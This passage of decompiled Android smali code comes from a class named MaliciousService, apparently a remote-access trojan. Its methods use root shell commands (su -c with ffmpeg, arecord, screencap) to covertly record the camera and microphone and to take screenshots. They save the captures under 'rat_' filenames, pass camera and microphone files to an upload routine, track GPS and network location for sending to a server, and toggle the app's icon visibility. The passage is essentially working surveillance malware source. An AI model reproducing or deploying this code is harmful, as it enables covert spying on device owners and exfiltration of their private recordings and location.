    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 488
    return-void

    .line 479
    :cond_133
    :goto_133
    const-string p1, "Location, server config, or device ID is null, not sending."

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 480
    return-void
.end method

.method private showIcon()V
    .registers 4

    .line 813
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 814
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.example.android.MainActivity"

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 815
    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 816
    const-string v0, "MaliciousService"

    const-string v1, "App icon shown."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 817
    return-void
.end method

.method private startLiveCamera()V
    .registers 8

    .line 736
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 737
    const-string v0, "Cannot start camera: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 738
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 739
    return-void

    .line 741
    :cond_11
    const-string v0, "Simulating live camera capture..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 742
    new-instance v0, Ljava/io/File;

    sget-object v2, Landroid/os/Environment;->DIRECTORY_MOVIES:Ljava/lang/String;

    invoke-static {v2}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "rat_camera_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".mp4"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 743
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    .line 745
    :try_start_42
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/String;

    const-string v5, "su"

    const/4 v6, 0x0

    aput-object v5, v4, v6

    const-string v5, "-c"

    const/4 v6, 0x1

    aput-object v5, v4, v6

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "ffmpeg -f v4l2 -i /dev/video0 -vcodec mpeg4 -b 800k -r 30 -s 640x480 -y "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x2

    aput-object v2, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 746
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    move-result v2

    .line 747
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "ffmpeg process exited with code: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 748
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_b7

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v6, v2, v4

    if-lez v6, :cond_b7

    .line 749
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Camera capture started: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 750
    const-string v2, "camera"

    invoke-direct {p0, v0, v2}, Lcom/example/android/MaliciousService;->uploadFile(Ljava/io/File;Ljava/lang/String;)V

    goto :goto_bc

    .line 752
    :cond_b7
    const-string v0, "Camera file not found or empty after capture. Ensure ffmpeg is installed and device has camera access."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_bc
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_bc} :catch_bf
    .catch Ljava/lang/InterruptedException; {:try_start_42 .. :try_end_bc} :catch_bd

    .line 756
    :goto_bc
    goto :goto_da

    .line 754
    :catch_bd
    move-exception v0

    goto :goto_c0

    :catch_bf
    move-exception v0

    .line 755
    :goto_c0
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error starting live camera: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 757
    :goto_da
    return-void
.end method

.method private startLiveMic()V
    .registers 8

    .line 760
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 761
    const-string v0, "Cannot start microphone: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 762
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 763
    return-void

    .line 765
    :cond_11
    const-string v0, "Simulating live microphone capture..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 766
    new-instance v0, Ljava/io/File;

    sget-object v2, Landroid/os/Environment;->DIRECTORY_MUSIC:Ljava/lang/String;

    invoke-static {v2}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "rat_mic_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".wav"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 767
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    .line 769
    :try_start_42
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/String;

    const-string v5, "su"

    const/4 v6, 0x0

    aput-object v5, v4, v6

    const-string v5, "-c"

    const/4 v6, 0x1

    aput-object v5, v4, v6

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "arecord -D plughw:1,0 -f cd -t wav -r 44100 -c 2 -d 60 -o "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x2

    aput-object v2, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 770
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    move-result v2

    .line 771
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "arecord process exited with code: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 772
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_b7

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v6, v2, v4

    if-lez v6, :cond_b7

    .line 773
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Microphone capture started: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 774
    const-string v2, "mic"

    invoke-direct {p0, v0, v2}, Lcom/example/android/MaliciousService;->uploadFile(Ljava/io/File;Ljava/lang/String;)V

    goto :goto_bc

    .line 776
    :cond_b7
    const-string v0, "Microphone file not found or empty after capture. Ensure audio capture is set up correctly."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_bc
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_bc} :catch_bf
    .catch Ljava/lang/InterruptedException; {:try_start_42 .. :try_end_bc} :catch_bd

    .line 780
    :goto_bc
    goto :goto_da

    .line 778
    :catch_bd
    move-exception v0

    goto :goto_c0

    :catch_bf
    move-exception v0

    .line 779
    :goto_c0
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error starting live microphone: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 781
    :goto_da
    return-void
.end method

.method private startLocationUpdates()V
    .registers 12

    .line 889
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_e

    .line 890
    const-string v0, "Cannot start location updates: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 891
    return-void

    .line 894
    :cond_e
    :try_start_e
    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {p0, v0}, Lcom/example/android/MaliciousService;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_25

    const-string v0, "android.permission.ACCESS_COARSE_LOCATION"

    .line 895
    invoke-virtual {p0, v0}, Lcom/example/android/MaliciousService;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1f

    goto :goto_25

    .line 919
    :cond_1f
    const-string v0, "Location permissions not granted!"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_81

    .line 896
    :cond_25
    :goto_25
    iget-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v2, "gps"

    invoke-virtual {v0, v2}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0
    :try_end_2d
    .catch Ljava/lang/SecurityException; {:try_start_e .. :try_end_2d} :catch_82

    const-string v2, "50.0f"

    const-string v3, "120000"

    if-eqz v0, :cond_50

    .line 897
    :try_start_33
    iget-object v4, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v5, "gps"

    .line 899
    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    .line 900
    invoke-static {v2}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v8

    iget-object v9, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 902
    invoke-virtual {v0}, Landroid/os/Handler;->getLooper()Landroid/os/Looper;

    move-result-object v10

    .line 897
    invoke-virtual/range {v4 .. v10}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;Landroid/os/Looper;)V

    .line 903
    const-string v0, "Requested GPS location updates."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_55

    .line 905
    :cond_50
    const-string v0, "GPS provider not enabled."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 907
    :goto_55
    iget-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v4, "network"

    invoke-virtual {v0, v4}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7c

    .line 908
    iget-object v4, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v5, "network"

    .line 910
    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    .line 911
    invoke-static {v2}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v8

    iget-object v9, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 913
    invoke-virtual {v0}, Landroid/os/Handler;->getLooper()Landroid/os/Looper;

    move-result-object v10

    .line 908
    invoke-virtual/range {v4 .. v10}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;Landroid/os/Looper;)V

    .line 914
    const-string v0, "Requested Network location updates."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_81

    .line 916
    :cond_7c
    const-string v0, "Network provider not enabled."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_81
    .catch Ljava/lang/SecurityException; {:try_start_33 .. :try_end_81} :catch_82

    .line 923
    :goto_81
    goto :goto_9d

    .line 921
    :catch_82
    move-exception v0

    .line 922
    invoke-virtual {v0}, Ljava/lang/SecurityException;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SecurityException requesting location updates: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 924
    :goto_9d
    return-void
.end method

.method private stopLiveCamera()V
    .registers 6

    .line 784
    const-string v0, "Stopping live camera capture..."

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 786
    :try_start_7
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "su"

    const/4 v4, 0x0

    aput-object v3, v2, v4

    const-string v3, "-c"

    const/4 v4, 0x1

    aput-object v3, v2, v4

    const-string v3, "pkill ffmpeg"

    const/4 v4, 0x2

    aput-object v3, v2, v4

    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 787
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    move-result v0

    .line 788
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ffmpeg process killed with code: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3b
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_3b} :catch_3e
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_3b} :catch_3c

    .line 791
    goto :goto_59

    .line 789
    :catch_3c
    move-exception v0

    goto :goto_3f

    :catch_3e
    move-exception v0

    .line 790
    :goto_3f
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error stopping live camera: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 792
    :goto_59
    return-void
.end method

.method private stopLiveMic()V
    .registers 6

    .line 795
    const-string v0, "Stopping live microphone capture..."

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 797
    :try_start_7
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "su"

    const/4 v4, 0x0

    aput-object v3, v2, v4

    const-string v3, "-c"

    const/4 v4, 0x1

    aput-object v3, v2, v4

    const-string v3, "pkill arecord"

    const/4 v4, 0x2

    aput-object v3, v2, v4

    invoke-virtual {v0, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 798
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    move-result v0

    .line 799
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "arecord process killed with code: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3b
    .catch Ljava/io/IOException; {:try_start_7 .. :try_end_3b} :catch_3e
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_3b} :catch_3c

    .line 802
    goto :goto_59

    .line 800
    :catch_3c
    move-exception v0

    goto :goto_3f

    :catch_3e
    move-exception v0

    .line 801
    :goto_3f
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error stopping live microphone: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 803
    :goto_59
    return-void
.end method

.method private stopLocationUpdates()V
    .registers 3

    .line 927
    iget-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    if-eqz v0, :cond_12

    iget-object v1, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    if-eqz v1, :cond_12

    .line 928
    invoke-virtual {v0, v1}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V

    .line 929
    const-string v0, "MaliciousService"

    const-string v1, "Location updates stopped."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 931
    :cond_12
    return-void
.end method

.method private takeScreenshot()V
    .registers 10

    .line 649
    const-string v0, "Screenshot file deleted successfully."

    const-string v1, "Failed to delete screenshot file."

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v2

    const-string v3, "MaliciousService"

    if-nez v2, :cond_15

    .line 650
    const-string v0, "Cannot take screenshot: Permissions not granted."

    invoke-static {v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 651
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 652
    return-void

    .line 654
    :cond_15
    const-string v2, "Attempting to take screenshot..."

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 655
    new-instance v2, Ljava/io/File;

    sget-object v4, Landroid/os/Environment;->DIRECTORY_PICTURES:Ljava/lang/String;

    invoke-static {v4}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v4

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "rat_screenshot_"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ".png"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-direct {v2, v4, v5}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 656
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    .line 658
    :try_start_46
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    const/4 v6, 0x3

    new-array v6, v6, [Ljava/lang/String;

    const-string v7, "su"

    const/4 v8, 0x0

    aput-object v7, v6, v8

    const-string v7, "-c"

    const/4 v8, 0x1

    aput-object v7, v6, v8

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "screencap -p "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v7, 0x2

    aput-object v4, v6, v7

    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v4

    .line 659
    invoke-virtual {v4}, Ljava/lang/Process;->waitFor()I

    move-result v4

    .line 660
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "screencap process exited with code: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 661
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_bb

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    const-wide/16 v6, 0x0

    cmp-long v8, v4, v6

    if-lez v8, :cond_bb

    .line 662
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Screenshot captured: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

